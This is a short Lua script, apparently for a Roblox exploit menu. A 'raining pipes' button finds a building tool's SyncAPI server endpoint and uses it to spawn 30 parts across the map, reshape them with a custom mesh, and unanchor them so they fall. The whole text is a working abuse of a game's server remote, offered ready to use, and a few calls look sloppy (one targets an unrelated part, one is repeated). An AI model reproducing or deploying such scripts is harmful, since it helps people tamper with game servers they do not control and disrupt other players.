newbutton("ok","raining pipes",function() 
    
for _,v in player:GetDescendants() do
        if v.Name == "SyncAPI" then
            tool = v.Parent
        end
    end
    for _, v in ipairs(char:GetChildren()) do
        if v:FindFirstChild("SyncAPI") then
            tool = v.Parent
        end
    end
    remote = tool.SyncAPI.ServerEndpoint -- this part is not mine
    
    
    
    
    
function doit(part)
    
    
    local args = {
	"CreateMeshes",
	{
		{
			Part = part
		}
	}
}
remote:InvokeServer(unpack(args))
    
    local args = {
	"SyncMesh",
	{
		{
			Scale = vector.create(-20, -20, -20),
			Part = part
		}
	}
}

remote:InvokeServer(unpack(args))
local args = {
	"SyncMesh",
	{
		{
			MeshType = Enum.MeshType.FileMesh,
			Part = workspace:WaitForChild("Part")
		}
	}
}
remote:InvokeServer(unpack(args))

local args = {
	"SyncMesh",
	{
		{
			Part = part,
			MeshId = "rbxassetid://17551699806"
		}
	}
}
remote:InvokeServer(unpack(args))

remote:InvokeServer(unpack(args))
local args = {
	"SyncAnchor",
	{
		{
			Part = part,
			Anchored = false
		}
	}
}
remote:InvokeServer(unpack(args))
end

 


for i = 1,30 do
local newpart = remote:InvokeServer("CreatePart","Normal",CFrame.new(math.random(-500,500),200,math.random(-500,500)),workspace)
doit(newpart)
end

wait(0.2)



end)
